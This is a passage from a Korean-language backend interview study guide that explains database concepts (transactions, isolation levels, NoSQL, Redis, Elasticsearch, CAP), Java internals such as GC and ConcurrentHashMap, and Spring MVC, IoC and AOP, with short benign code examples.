- **역정규화**(De-normalization): 성능(조인 비용 감소)을 위해 의도적으로 중복 허용.

</details>

<details>
<summary>트랜잭션과 ACID 속성</summary>

<br>

"트랜잭션은 **데이터베이스 상태를 변경하는 작업의 실행 단위**입니다. **ACID 특성**으로 안전성을 보장하며, **Undo Log로 롤백**, **Redo Log로 복구**합니다."

**ACID**:
- **A** (Atomicity, 원자성): "All or Nothing". 모두 성공하거나 모두 실패해야 함.
- **C** (Consistency, 일관성): 트랜잭션 전후 데이터 제약조건 만족.
- **I** (Isolation, 격리성): 다른 트랜잭션의 끼어들기 방지.
- **D** (Durability, 지속성): 커밋 후엔 영구 저장.

</details>

<details>
<summary>트랜잭션 격리 수준 (Isolation Level)</summary>

<br>

1. **Read Uncommitted**: 커밋 안 된 데이터 읽기 가능 (Dirty Read 발생).
2. **Read Committed**: 커밋 된 데이터만 읽기. (대부분 DB 기본값)
3. **Repeatable Read**: 트랜잭션 내에서 동일 조회 결과 보장 (MySQL 기본값).
4. **Serializable**: 완벽한 직렬화. 동시성 최악.

</details>

<details>
<summary>Join의 종류</summary>

<br>

- **INNER JOIN**: 교집합. 양쪽 다 있는 경우만.
- **LEFT / RIGHT JOIN**: 기준 테이블 전체 + 매칭되는 반대쪽 (없으면 NULL).
- **FULL OUTER JOIN**: 합집합.

</details>

<details>
<summary>NoSQL vs RDBMS</summary>

<br>

RDBMS는 ACID를 보장하고 테이블 간 관계를 정의하는 데이터베이스입니다. NoSQL은 SQL을 사용하지 않고 Key-Value, Document, Graph 등 다양한 형태의 데이터를 저장할 수 있는 데이터베이스입니다.

**NoSQL 종류**

| 유형              | 설명                           | 예시             |
| :---------------- | :----------------------------- | :--------------- |
| **Key-Value**     | 키로 값 조회, 가장 단순        | Redis, DynamoDB  |
| **Document**      | JSON/BSON 문서 저장            | MongoDB, CouchDB |
| **Column-Family** | 컬럼 단위로 저장, 대용량 분석  | Cassandra, HBase |
| **Graph**         | 노드-엣지 관계 저장, 관계 탐색 | Neo4j            |

> **Column-Family 저장 방식**
>
> **RDBMS (행 기반)**: 한 행의 모든 컬럼이 연속 저장
> ```
> Row1: [id=1, name="김철수", age=25, city="서울"]
> Row2: [id=2, name="이영희", age=30, city="부산"]
> ```
>
> **Column-Family (열 기반)**: 같은 컬럼끼리 연속 저장
> ```
> id:   [1, 2, 3...]
> name: ["김철수", "이영희"...]
> age:  [25, 30...]
> ```
>
> **왜 분석에 유리한가?**
> `SELECT AVG(age) FROM users` 실행 시:
> - RDBMS: 모든 행을 읽어야 함 (불필요한 name, city도 읽음)
> - Column-Family: age 컬럼만 읽음 -> 디스크 I/O 감소
>
> | DB | 용도 |
> | :--- | :--- |
> | **Cassandra** | 시계열 데이터, 로그, IoT |
> | **HBase** | Hadoop 기반 대용량 분석 |

> **BASE vs ACID**
>
> NoSQL은 ACID 대신 **BASE** 모델을 따름
>
> | 약어 | 의미 | 설명 |
> | :--- | :--- | :--- |
> | **BA** | Basically Available | 기본적으로 가용성 보장 |
> | **S** | Soft state | 상태가 시간에 따라 변할 수 있음 |
> | **E** | Eventual consistency | 결국에는 일관성 도달 |


</details>

<details>
<summary>낙관적 락(Optimistic Lock)과 비관적 락(Pessimistic Lock)</summary>

<br>

- **비관적 락** (Pessimistic Lock):
  - 트랜잭션 충돌이 발생할 것이라고 가정하고, 데이터를 읽을 때부터 락을 겁니다. (DB Lock 기능 이용 - `SELECT ... FOR UPDATE`)
  - 데이터 무결성 보장 수준이 높지만, 동시성 저하 우려.
- **낙관적 락** (Optimistic Lock):
  - 트랜잭션 충돌이 잘 발생하지 않을 것이라고 가정. 락을 걸지 않고, 커밋 시점에 버전(Version) 정보로 충돌 여부 확인.
  - JPA에서 `@Version` 어노테이션 사용. 충돌 시 애플리케이션 레벨에서 예외 처리 필요.

</details>

<details>
<summary>MVCC (Multi-Version Concurrency Control) 란?</summary>

<br>

**MySQL InnoDB**에서 락을 걸지 않고도 일관된 읽기를 제공하는 기술입니다.
- **원리**: 데이터 업데이트 시, 이전 값을 **Undo Log**에 보관합니다. 다른 트랜잭션이 해당 데이터를 읽으려 하면 Undo Log에 있는 이전 버전을 보여줍니다.
- **Snapshot Isolation**: 트랜잭션 시작 시점이 아닌, **첫 SELECT 문이 실행되는 시점**에 스냅샷을 생성하여 일관성을 보장합니다.
- 이를 통해 `READ_COMMITTED`나 `REPEATABLE_READ` 격리 수준에서 **Non-Blocking Read**를 가능하게 합니다.

> **참고**: [MySQL MVCC 상세 동작 원리 (Consistent Read, Undo Log)](https://gotobill.github.io/mysql-part6/)

</details>

<details>
<summary>Redis에 대해서 간단히 설명해주세요.</summary>

<br>

> 면접 답변
> "Redis는 **인메모리 Key-Value 저장소**로, **싱글 스레드 + 이벤트 루프**로 동작해 원자적 연산을 보장합니다. **RDB/AOF**로 영속성을 지원하고, 캐시, 세션, 실시간 랭킹에 사용됩니다."

**주요 특징**:
- **자료구조**: String, List, Set, Sorted Set, Hash 등 다양한 구조 지원.
- **싱글 스레드**: 원자성(Atomic) 보장, Race Condition 적음. (하지만 O(N) 명령어 주의)
- **영속성 (Persistence)**:
  - **RDB**: 특정 시점의 스냅샷 저장 (빠른 복구, 데이터 유실 가능성).
  - **AOF**: 모든 쓰기 명령 기록 (데이터 유실 적음, 파일 큼, 복구 느림).
- **Cluster**: 데이터 샤딩 지원.

> **RDB vs AOF 영속성**
>
> | 구분 | RDB (스냅샷) | AOF (로그) |
> | :--- | :--- | :--- |
> | 저장 방식 | 특정 시점 메모리 전체 덤프 | 모든 쓰기 명령 로그 기록 |
> | 복구 속도 | 빠름 (파일 로드) | 느림 (명령어 재실행) |
> | 데이터 유실 | 스냅샷 이후 유실 가능 | 거의 없음 |
> | 파일 크기 | 작음 | 큼 |
>
> ```
> # RDB: 메모리 상태 그대로 저장
> [전체 데이터 바이너리]
>
> # AOF: 명령어 로그
> SET user:1 "김철수"
> SET user:2 "이영희"
> INCR counter
> ```
>
> RDB + AOF 둘 다 사용 (RDB로 빠른 복구 + AOF로 유실 최소화)

</details>

<details>
<summary>Redis와 Memcached의 차이</summary>

<br>

| 구분     | Redis                               | Memcached                   |
| -------- | ----------------------------------- | --------------------------- |
| 자료구조 | 다양한 자료구조 지원 (List, Set 등) | String만 지원               |
| 영속성   | RDB, AOF 지원                       | 미지원 (메모리 날아가면 끝) |
| 스레드   | 싱글 스레드                         | 멀티 스레드                 |
| 용도     | 캐시 + 메시지큐, 랭킹, 세션 등      | 단순 캐싱                   |

</details>

<details>
<summary>ElasticSearch에 대해서 설명해주세요.</summary>

<br>

Apache Lucene 기반의 **역인덱스(Inverted Index) 기반 분산 검색 엔진**입니다.

**역인덱스(Inverted Index) 동작 원리**:
일반적인 RDBMS가 "행 기반" 검색(`LIKE %검색어%`)을 한다면, ElasticSearch는 책 맨 뒤의 색인처럼 **단어 -> 문서 위치**를 저장합니다.

| Token (Keyword) | Document IDs |
| :-------------- | :----------- |
| "개발"          | [Doc1, Doc3] |
| "면접"          | [Doc1, Doc2] |
| "취업"          | [Doc2]       |

1. **Tokenizing**: 문장을 단어(Token) 단위로 쪼갭니다. ("개발 면접 준비" -> `["개발", "면접", "준비"]`)
2. **Indexing**: 쪼갠 단어를 Key로, 문서 ID를 Value로 저장합니다.
3. **Searching**: "개발"을 검색하면 전체 문서를 훑지 않고, 바로 `[Doc1, Doc3]`를 찾아냅니다. (매우 빠름)

- **특징**:
  - **형태소 분석**: '먹었다', '먹으니' -> '먹다' 검색 가능.
  - **분산 저장**: 데이터를 샤드(Shard) 단위로 쪼개어 여러 노드에 저장 (Scale-out 용이).
  - **RESTful API**: HTTP로 통신.

**RDBMS vs ElasticSearch 비교**:
- RDBMS: 정확한 데이터 조작, 트랜잭션 위주. (`WHERE id = 1`)
- ElasticSearch: 전문(Full-Text) 검색, 로그 분석, 비정형 데이터. (`"맛집" 검색`)

</details>

<details>
<summary>MongoDB에 대해서 설명해주세요.</summary>

<br>

**Document 지향 NoSQL** 데이터베이스입니다.

- **특징**:
  - **JSON(BSON)** 형식 저장: 스키마가 유연함 (Schema-less).
  - **Sharding**: 대용량 데이터를 여러 서버에 분산 저장 용이.
  - **Replica Set**: 자동 장애 복구(Failover) 및 고가용성 보장.
- **사용처**: 로그 데이터, 비정형 데이터, 필드가 자주 변하는 서비스.

</details>

<details>
<summary>CAP 이론이란?</summary>

<br>

분산 시스템에서는 다음 3가지 중 **2가지만 만족할 수 있다**는 이론입니다.

1. **C (Consistency, 일관성)**: 모든 노드가 같은 시간에 같은 데이터를 보여줌.
2. **A (Availability, 가용성)**: 일부 노드가 죽어도 응답을 받을 수 있음.
3. **P (Partition Tolerance, 분할 내성)**: 네트워크 단절이 일어나도 시스템이 동작함.

**현실적인 선택**: P는 무조건 가져가야 하므로, **CP** or **AP** 중 선택.
- **CP (RDBMS, HBase, Redis)**: 일관성 우선. 네트워크 끊기면 에러 반환.
- **AP (Cassandra, DynamoDB)**: 가용성 우선. 네트워크 끊겨도 일단 응답 (나중에 동기화 - **Eventual Consistency**).

</details>

<details>
<summary>Connection Pool (DBCP) 이란?</summary>

<br>

데이터베이스 연결(Connection)을 맺는 과정은 비용(시간, 리소스)이 많이 듭니다.
이를 해결하기 위해 **미리 일정 수의 Connection을 만들어 Pool에 보관**해두고, 요청 시 빌려주고 사용 후 반납하는 방식입니다.
- **HikariCP**: Spring Boot 2.0부터 기본 제공되는 고성능 Connection Pool 라이브러리.

</details>

<details>
<summary>DB Replication vs Clustering</summary>

<br>

- **Replication** (복제):
  - **Master-Slave** 구조. Master는 쓰기(Insert/Update/Delete), Slave는 읽기(Select) 담당.
  - 데이터 백업 및 읽기 분산 처리로 성능 향상. 동기화 지연 발생 가능.
- **Clustering** (클러스터링):
  - 여러 DB 서버를 하나의 시스템처럼 동작하게 함.
  - **Active-Active**: 모든 서버가 읽기/쓰기 가능 (부하 분산).
  - **Active-Standby**: 장애 시 대기 서버가 역할 수행 (고가용성 HA).

</details>

## 4. Java

<details>
<summary>Java 컴파일 과정과 JVM</summary>

<br>

1. `.java` 소스코드 -> `javac` 컴파일 -> `.class` 바이트코드
2. **JVM**(Class Loader)이 바이트코드 로드
3. **Execution Engine** (Interpreter + **JIT Compiler**)이 기계어로 변환 실행

**JIT Compiler**: 반복되는 코드를 네이티브 코드로 미리 컴파일해두어 인터프리터의 느린 속도 개선.

</details>

<details>
<summary>GC (Garbage Collection) 란?</summary>

<br>

힙 메모리에서 더 이상 사용되지 않는 객체를 자동으로 정리하는 기능.

**동작 원리** (Generational GC):
- **Eden**: 새 객체 생성. 꽉 차면 **Minor GC**.
- **Survivor**: 살아남은 객체 이동.
- **Old**: 오래 살아남은 객체 이동. 꽉 차면 **Major GC** (Full GC).

**G1GC (Garbage First GC)**:
- Heap을 **Region**이라는 논리적 단위로 나눔.
- Garbage가 많은 Region부터 먼저 청소 (Garbage First).
- **Stop-The-World** 시간이 짧고 예측 가능하여 대용량 메모리에 적합 (Java 9+ 기본값).

</details>

<details>
<summary>Java의 동시성 이슈와 해결 (Synchronized, Volatile)</summary>

<br>

- **Synchronized**: 락(Lock)을 걸어 한 번에 하나의 스레드만 접근 허용 (가시성 + 원자성 보장).
- **Volatile**: CPU 캐시가 아닌 **메인 메모리에서 직접 읽기/쓰기** (가시성 보장, 원자성 보장 X). 상태 플래그 용도로 적합.
- **Atomic Class**: CAS 알고리즘으로 락 없이 스레드 안전한 연산 제공.

</details>

<details>
<summary>동시성 로직에 쓰이는 자료구조 (ConcurrentHashMap)</summary>

<br>

**HashMap vs Hashtable vs ConcurrentHashMap**

| 구분                  | Thread-Safe | 특징                                                        |
| :-------------------- | :---------- | :---------------------------------------------------------- |
| **HashMap**           | X           | 빠름. 멀티스레드 환경에서 사용 불가.                        |
| **Hashtable**         | O           | 모든 메서드에 `synchronized`가 걸려있어 매우 느림. (비권장) |
| **ConcurrentHashMap** | O           | **CAS + Synchronized**를 혼합하여 성능을 극대화.            |

**ConcurrentHashMap 동작 원리 (Java 8+)**
기존(Java 7)의 Segment Lock 방식에서 발전하여, **버킷 단위 동기화**를 사용합니다.

1.  **빈 버킷에 데이터 삽입 시 (CAS 사용)**
    -   Lock을 걸지 않고 **CAS** (Compare-And-Swap) 알고리즘을 사용해 원자적으로 삽입합니다.
    -   충돌이 없으면 매우 빠르게 처리됩니다.

2.  **버킷에 이미 데이터가 있을 시 (Synchronized 사용)**
    -   해당 버킷의 **첫 번째 노드** (Head)에만 `synchronized`를 걸어 잠급니다.
    -   다른 버킷에는 영향을 주지 않으므로 동시성이 높습니다.

```java
// 실제 구현 로직 (단순화)
final V putVal(K key, V value, boolean onlyIfAbsent) {
    int hash = spread(key.hashCode());
    
    for (Node<K,V>[] tab = table;;) {
        Node<K,V> f; int n, i, fh;
        
        // 1. 버킷이 비어있으면 -> CAS로 삽입 (Lock 없음!)
        if ((f = tabAt(tab, i = (n - 1) & hash)) == null) {
            if (casTabAt(tab, i, null, new Node<K,V>(hash, key, value, null)))
                break; 
        }
        // 2. 버킷에 값이 있으면 -> synchronized (해당 버킷만 Lock)
        else {
            synchronized (f) {
                if (tabAt(tab, i) == f) {
                    // 리스트 or 트리에 노드 추가 로직
                }
            }
        }
    }
    return null;
}
```

> **Q. 왜 빈 버킷은 CAS고, 차 있으면 Synchronized인가요?**
>
> 1.  **빈 버킷** (CAS):
>     -   아무것도 없는 자리에 "새 노드 꽂기"는 단순한 교체 작업입니다.
>     -   복잡한 포인터 연결이 필요 없으므로, **Lock보다 훨씬 가벼운 CAS** (낙관적 락)로 처리하는 게 성능상 이득입니다.
>
> 2.  **데이터가 있는 경우 (Synchronized)**:
>     -   이미 노드가 있다면 **LinkedList**나 **Red-Black Tree** 형태로 연결되어 있습니다.
>     -   **왜 헤드만 잠글까?**: 자바의 `synchronized`는 객체 단위로 락을 겁니다. 별도의 락 객체를 두는 대신, 리스트의 진입점인 **헤드 노드 객체 자체**를 락으로 사용하면 메모리를 아끼면서 해당 버킷 전체를 독점하는 효과를 낼 수 있습니다. (헤드를 못 지나가면 뒤도 못 가니까요!)
>     -   **어떻게 잠그나?**: 코드로는 `synchronized(node)` 와 같이 **노드 객체 자체를 파라미터**로 넘겨서 락을 겁니다.
> ```java
> // (참고) 일반적인 전용 락 객체 사용 방식
> class MyClass {
>     // 1. 전용 락 객체 생성
>     private final Object lock = new Object();  // 이 객체의 모니터 락 사용
>     
>     public void method() {
>         synchronized(lock) {  // lock 객체의 모니터 락 획득
>             // 임계 영역
>         }
>     }
> }
> ```
 -   새 노드를 뒤에 연결하거나 트리를 회전시키는 작업은 여러 단계의 포인터 변경이 필요합니다.
 -   이때 CAS를 쓰면 실패 시 계속 재시도(Retry)해야 해서 오히려 CPU 낭비가 심해집니다.
 -   따라서 해당 **버킷의 헤드**(첫 노드)만 딱 잡고(`synchronized`) 안전하게 처리하는 게 효율적입니다. 이 방식을 통해 **다른 버킷에 대한 접근은 차단하지 않으므로** 동시성이 유지됩니다.

</details>

<details>
<summary>HashMap의 내부 동작 원리와 해시 충돌 해결</summary>

<br>

1. **해시 충돌 해결**: **Chaining** 방식 (LinkedList로 연결).
2. **최적화 (Java 8+)**: 하나의 버킷에 데이터가 **8개 이상** 쌓이면 **Red-Black Tree**로 변환하여 탐색 속도를 `O(N)`에서 `O(log N)`으로 개선. (6개 이하가 되면 다시 LinkedList로 복귀)

</details>

<details>
<summary>String, StringBuilder, StringBuffer</summary>

<br>

- **String**: **불변**(Immutable). 연산 시 매번 새 객체 생성.
- **StringBuilder**: **가변**. 동기화 없음. 단일 스레드에서 빠름.
- **StringBuffer**: **가변**. `Synchronized`로 동기화. 멀티 스레드 안전.

</details>

<details>
<summary>Interface vs Abstract Class</summary>

<br>

- **Interface**: "구현 명세(Can-do)". 다중 상속 가능. 상수와 추상 메서드 위주 (Java 8부터 default 메서드 가능).
- **Abstract Class**: "공통 기능 추상화(Is-a)". 단일 상속. 상태(멤버 변수)를 가질 수 있음.

</details>

<details>
<summary>제네릭(Generics)과 타입 소거(Type Erasure)</summary>

<br>

- **제네릭**: 컴파일 타임에 타입을 체크하여 타입 안정성을 높이고 형변환 번거로움을 줄임.
- **타입 소거**: 컴파일 후 런타임에는 제네릭 타입 정보가 제거됨(`List<String>` -> `List`). Java 하위 호환성을 위함.

**효과 1. 타입 안정성 (Type Safety)**

> **제네릭 없이 사용**
> ```java
> ArrayList list = new ArrayList();
> list.add("문자열");
> list.add(123);  // 컴파일 OK, 런타임에 문제 발생 가능
> 
> String str = (String) list.get(1);  // ClassCastException 위험!
> ```
>
> **제네릭 사용**
> ```java
> ArrayList<String> list = new ArrayList<>();
> list.add("문자열");
> // list.add(123);  // 컴파일 에러! ← 여기서 잡힘
> 
> String str = list.get(1);
> ```

**효과 2. 형변환 번거로움 제거**

> **전 (캐스팅 필요)**
> ```java
> List list = new ArrayList();
> list.add(new Integer(10));
> Integer num = (Integer) list.get(0);  // 매번 명시적 형변환 (Casting)
> ```
>
> **후 (자연스러운 코드)**
> ```java
> List<Integer> list = new ArrayList<>();
> list.add(10);
> Integer num = list.get(0);  // 자동 타입 변환 (형변환 불필요)
> ```

</details>

<details>
<summary>Checked vs Unchecked Exception</summary>

<br>

- **Checked**: `Exception` 상속. **반드시 처리(try-catch)해야 함**. (IOException 등)
- **Unchecked**: `RuntimeException` 상속. 명시적 처리 강제 안 함. (NullPointerException 등)
- Spring 트랜잭션 롤백은 기본적으로 **Unchecked Exception**에서만 발생.

</details>

<details>
<summary>equals()와 hashCode()의 관계는?</summary>

<br>

- **equals()**: 두 객체의 **논리적 동등성**(값의 일치)을 비교.
- **hashCode()**: 객체를 식별하는 **정수값**을 반환 (해시 테이블 등에서 사용).

> **Q. equals/hashCode를 재정의 안 하고 HashMap에 넣으면?**
> 1.  `Object`의 기본 `hashcode()`는 **객체의 메모리 주소** 기반으로 값을 생성합니다.
> 2.  따라서 필드 값이(내용이) 똑같은 객체라도, **서로 다른 해시코드**가 나와서 아예 **다른 버킷**에 저장이 됩니다.
> 3.  결국 `map.get(new Key(...))`로 값을 찾으려 해도 `null`이 나옵니다. (영원히 못 찾음 😱)
> 4.  참고로 `Object.equals()`도 기본적으로 `==` (주소 비교)와 동일합니다.

- **계약**(Contract):
  1. `equals()`가 `true`이면, 두 객체의 `hashCode()`는 반드시 같아야 함.
  2. `hashCode()`가 같다고 해서 `equals()`가 반드시 `true`일 필요는 없음 (해시 충돌).
  - equals를 재정의할 때 hashCode를 재정의하지 않으면, 같은 값을 가진 객체가 해시 컬렉션(HashMap, HashSet)에서 다른 객체로 취급되어 값을 찾지 못하는 오동작 발생.
 
HashMap 키 비교는 hashCode 먼저, 같으면 equals() 비교합니다.

</details>

<details>
<summary>Primitive Type과 Wrapper Class의 차이</summary>

<br>

- **Primitive Type** (기본형): `int`, `long`, `boolean` 등. **Stack** 메모리에 실제 값 저장. `null` 불가. 산술 연산 빠름.
- **Wrapper Class**: `Integer`, `Long`, `Boolean` 등. **Heap** 메모리에 객체로 저장. `null` 가능. Collection(`<Integer>` 등)에서 사용.
- **Auto-Boxing / Unboxing**: Java 5부터 컴파일러가 자동으로 변환해줌.

</details>

<details>
<summary>static 키워드의 의미와 메모리 위치</summary>

<br>

- **static**: 객체 생성이 아닌 **클래스에 속한** 멤버임을 명시.
- **메모리**: 프로그램 시작 시 **Method Area** (Static Area)에 할당되고, 프로그램 종료 시 해제됨.
- **특징**: 모든 인스턴스가 공유. 인스턴스 생성 없이 `ClassName.variable`로 접근 가능.

</details>

<details>
<summary>Java 8의 대표적인 특징 (Stream, Lambda, Optional)</summary>

<br>

1. **Lambda Expression**: 함수형 프로그래밍 지원. 익명 클래스를 간결하게 표현. `(a, b) -> a + b`
2. **Stream API**: 컬렉션 데이터를 선언형으로 처리. 병렬 처리 용이. `list.stream().filter(...).map(...).collect(...)`
3. **Optional**: NullPointerException 방지를 위한 Wrapper 클래스. 명시적으로 `null` 가능성을 표현. `Optional.ofNullable(...)`

</details>

<details>
<summary>Java의 Call by Value vs Call by Reference</summary>

<br>

Java는 **무조건 Call by Value** (값에 의한 호출) 입니다.

1.  **용어 정의**
    -   **Call by Value (값에 의한 호출)**: 함수 호출 시 인자로 전달되는 **변수의 값을 복사**하여 함수로 전달합니다. (원본 보존)
    -   **Call by Reference (참조에 의한 호출)**: 함수 호출 시 인자로 전달되는 **변수의 메모리 주소(참조) 자체**를 전달합니다. (원본 변경 가능, C++ 등에서 지원)

2.  **Java의 동작 방식**
    -   **기본형**(Primitive): 값이 그대로 **복사**되어 전달됨. (원본 영향 X)
    -   **참조형**(Reference): **주소값의 복사본**이 전달됨. (이게 핵심!)
        -   메서드 안에서 `member.name = "변경"` 처럼 **내부 상태**를 바꾸면 -> 주소를 타고 가서 바꾸니 **원본도 바뀜**.
        -   메서드 안에서 `member = new Member()` 처럼 **객체 자체**를 갈아 끼우면 -> **복사된 주소 변수**만 새 곳을 가리키게 되므로 **원본은 안 바뀜**.

> **`main`에서 `func(obj)` 호출 후 `obj = newObj` 할 때**
>
> **1. Java (Call by Value)**: 주소값(0x10)을 **복사**해서 줌
> ```text
> mainVar (0x10) -------------> [객체 A]
>
> paramVar (0x10) --(new)-----> [객체 B] (0x20)
>    ㄴ 0x20으로 바뀜               ㄴ mainVar는 여전히 [객체 A]를 가리킴 (영향 X)
> ```
>
> **2. Call by Reference**: 변수 공간(링크) 자체를 공유
> ```text
> mainVar  (0x10) --(공유)--------> [객체 A]
>            |
> paramVar (동일 공간) --(new)-----> [객체 B] (0x20)
>                                     ㄴ mainVar도 같이 [객체 B]를 가리키게 됨 (영향 O)
> ```

</details>

<details>
<summary>Reflection(리플렉션)이란?</summary>

<br>

구체적인 클래스 타입을 알지 못해도, 컴파일 된 바이트 코드를 통해 해당 클래스의 메서드, 타입, 변수(private 포함)들에 접근할 수 있도록 해주는 자바 API입니다.
- **사용처**: Spring Framework의 DI(@Autowired), JPA 엔티티 바인딩 등 프레임워크 내부에서 주로 사용됨.
- **단점**: 오버헤드가 있어 성능 저하 가능성, 캡슐화 저해.

</details>

<details>
<summary>final 키워드의 사용법</summary>

<br>

1. **final variable**: 값을 변경할 수 없는 상수 (재할당 불가).
2. **final method**: 오버라이딩(Overriding) 불가.
3. **final class**: 상속(Inheritance) 불가.

</details>

<details>
<summary>직렬화(Serialization) 란?</summary>

<br>

자바 객체를 **바이트 스트림**으로 변환하여 파일 저장하거나 네트워크로 전송할 수 있게 하는 것.
- `implements Serializable` 인터페이스 필요.
- 반대는 **역직렬화**(Deserialization).
- `serialVersionUID`로 버전 관리 권장.

</details>

## 5. Spring Framework

<details>
<summary>Spring MVC 요청 처리 흐름</summary>

<br>
<img width="1049" height="459" alt="image" src="https://github.com/user-attachments/assets/8e51314f-352a-4f7b-861c-46e21086854b" />
<br>

Client -> **DispatcherServlet** -> **HandlerMapping** (Controller 찾기) -> **HandlerAdapter** -> **Controller** (비즈니스 로직) -> **ViewResolver** -> View/Data Response

**처리 흐름 (Case by Case)**

1.  **SSR** (서버 사이드 렌더링) - HTML 반환 (`@Controller`)
    -   `Client` -> `DispatcherServlet` -> `HandlerMapping` -> `HandlerAdapter` -> `Controller` -> **ViewResolver 확인** -> `View(JSP/Thymeleaf)` -> `HTML Response`

2.  **REST API** - JSON 데이터 반환 (`@RestController`, `@ResponseBody`)
    -   `Client` -> `DispatcherServlet` -> `HandlerMapping` -> `HandlerAdapter` -> `Controller` -> **HttpMessageConverter (Jackson)** -> `JSON Response`
    -   *특징: ViewResolver를 거치지 않고, 컨버터가 Body에 데이터를 직접 씁니다.*

> **Tip: Tomcat과 Spring의 경계는 어디인가요?**
> *   **Tomcat (Servlet Container)**: HTTP 요청을 받고(Socket 연결, 스레드 할당), `Filter`를 거쳐 **DispatcherServlet을 실행**시키는 단계까지 담당합니다.
> *   **Spring (Spring Container)**: **DispatcherServlet**이 요청을 잡는 순간(`doDispatch()`)부터가 스프링의 영역입니다. 이후 `HandlerMapping`, `Controller` 등을 타고 비즈니스 로직을 수행합니다.

**상세 주요 컴포넌트 역할**

1.  **DispatcherServlet** (Front Controller)
    -   Spring MVC의 핵심으로, 모든 HTTP 요청을 가장 먼저 받아 적절한 컴포넌트(핸들러, 뷰 등)로 위임합니다.
    -   `doDispatch()` 메서드에서 전체적인 요청 처리 파이프라인(매핑, 어댑터 실행, 렌더링)을 조율합니다.

2.  **HandlerMapping**
    -   요청 URL, 메서드 등을 분석하여 **어떤 컨트롤러 메서드가 처리할지**를 찾습니다 (`RequestMappingHandlerMapping`).
    -   애플리케이션 구동 시점에 `@RequestMapping` 정보를 미리 스캔하여 매핑 레지스트리에 저장해 둡니다.

3.  **HandlerAdapter**
    -   핸들러(컨트롤러)의 구현 방식에 상관없이 **일관된 방식으로 메서드를 실행**시켜주는 어댑터입니다.
    -   실제 메서드 실행 시 파라미터 바인딩(`ArgumentResolver`)과 반환값 처리(`ReturnValueHandler`)를 수행합니다.

4.  **@RestController vs @Controller**
    -   **@Controller**: `View` 렌더링이 주 목적이며, 반환된 이름(String)을 `ViewResolver`가 처리하여 HTML을 응답합니다.
    -   **@RestController**: `@Controller` + `@ResponseBody` 조합. 객체를 JSON으로 직렬화(`HttpMessageConverter`)하여 **HTTP Body**에 직접 씁니다.

5.  **ViewResolver**
    -   컨트롤러가 반환한 논리적인 뷰 이름(예: "home")을 **실제 물리적인 뷰 객체**(예: `/WEB-INF/views/home.jsp`)로 변환합니다.
    -   JSP, Thymeleaf 등 설정된 템플릿 엔진에 맞는 리졸버가 동작합니다.

6.  **ArgumentResolver & ReturnValueHandler**
    -   **ArgumentResolver**: `@RequestParam`, `@RequestBody` 등 메서드 파라미터 정보를 분석하여 실제 값을 주입해 줍니다.
    -   **ReturnValueHandler**: 응답 값을 `ModelAndView`로 만들지, JSON 메시지로 변환할지 등을 결정하고 처리합니다.

7.  **@RequestBody & @ResponseBody 동작**
    -   **@RequestBody**: HTTP 요청 본문(JSON)을 **Jackson 라이브러리**를 통해 자바 객체로 변환합니다.
    -   **@ResponseBody**: 자바 객체를 JSON으로 변환하여 응답 본문에 작성하며, `HttpMessageConverter`가 관여합니다.

8.  **예외 처리 (Exception Handling)**
    -   **@ExceptionHandler**: 특정 컨트롤러(또는 전역)에서 발생하는 예외를 잡아 처리합니다.
    -   **HandlerExceptionResolver**: 예외가 발생했을 때 적절한 에러 응답을 생성하는 전략 인터페이스입니다.

</details>

<details>
<summary>IoC (Inversion of Control) 와 DI (Dependency Injection)</summary>

<br>

- **IoC** (제어의 역전): 프로그램의 제어 흐름(객체 생성, 생명주기)을 개발자가 아닌 **프레임워크**(컨테이너)가 담당하는 것. -> 누가 제어하느냐
- **DI** (의존성 주입): IoC를 구현하는 방법으로, 객체를 직접 생성(`new`)하지 않고 **외부에서 주입**받는 것. -> 어떻게 제어하느냐

**상세 설명**
1.  **왜 쓰나요?**: 클래스 간의 **강한 결합도**(Coupling)를 끊어내어 유연한 코드 변경과 **테스트**(Mock 객체 주입)를 쉽게 만들기 위함입니다.
2.  **Spring Container** (`ApplicationContext`): 개발자 대신 빈(Bean)을 생성하고, 의존성을 연결해 주고, 초기화 및 소멸(생명주기)까지 관리해 줍니다.
3.  **권장 방식**: **생성자 주입**(Constructor Injection).
    -   필수 의존성을 강제할 수 있음.
    -   객체를 `final`로 선언하여 **불변성**(Immutability) 확보 가능.
    -   순환 참조(Circular Reference) 문제를 애플리케이션 구동 시점에 발견 가능.

</details>

<details>
<summary>Spring Bean 생명주기</summary>

<br>

**순서**: 객체 생성 -> 의존성 주입 -> 초기화 -> 사용 -> 소멸

1.  **스프링 컨테이너 기동**: 설정 파일을 읽고 등록할 빈들을 파악합니다.
2.  **객체 생성 (Instantiation)**: 생성자를 호출하여 빈 객체를 메모리에 올립니다.
3.  **의존성 주입 (Dependency Injection)**: 세터나 필드에 `@Autowired`가 있다면 의존 관계를 연결해 줍니다.
    *   *(참고: 생성자 주입은 객체 생성 단계에서 동시에 일어납니다.)*
4.  **초기화 (@PostConstruct)**: 의존성 주입이 끝난 후, 초기 데이터 로딩이나 세팅이 필요한 경우 실행됩니다.
    - Q. 왜 생성자에서 안 하고?
    - A. 생성자 시점엔 의존성 주입이 완벽하지 않을 수 있어서, 안전하게 DI 완료 후에 실행하는 것입니다.
5.  **빈 사용 (Usage)**: 애플리케이션이 동작하며 빈이 실제 로직을 수행합니다.
6.  **소멸 (@PreDestroy)**: 애플리케이션 종료 시 리소스 반납(DB 연결 해제 등)을 위해 실행됩니다.

```java
@Component
public class MyBean {
    
    @PostConstruct
    public void init() {
        System.out.println("의존성 주입 완료 후 실행됩니다.");
    }

    @PreDestroy
    public void close() {
        System.out.println("빈이 소멸되기 직전에 실행됩니다.");
    }
}
```

</details>

<details>
<summary>AOP (Aspect Oriented Programming)</summary>

<br>

**AOP** (관점 지향 프로그래밍): 로깅, 트랜잭션, 보안처럼 여러 곳에서 공통적으로 쓰이는 기능(**횡단 관심사**)을 핵심 비즈니스 로직에서 분리하여 재사용하는 기술입니다.

**상세 설명 및 용어**
스프링은 런타임에 **프록시(Proxy) 객체**를 만들어서 공통 로직을 수행합니다.

1.  **Aspect** (`@Aspect`)
    -   공통 기능(Advice)과 적용 장소(Pointcut)를 묶은 모듈입니다.
    ```java
    @Aspect
    @Component
    public class LogAspect { ... }
    ```

2.  **Pointcut** (`@Pointcut`)
    -   **"어디에"** 적용할지 타겟을 선별하는 식입니다.
    ```java
    // 반환타입 상관없음(*) com.example.service패키지하위(.*) 모든메서드(*(..))
    @Pointcut("execution(* com.example.service.*.*(..))")
    public void serviceLayer() {} 
    ```

3.  **Advice** (`@Before`, `@After`, `@Around`)
    -   **"언제"** 공통 로직을 실행할지 정의합니다.
    ```java
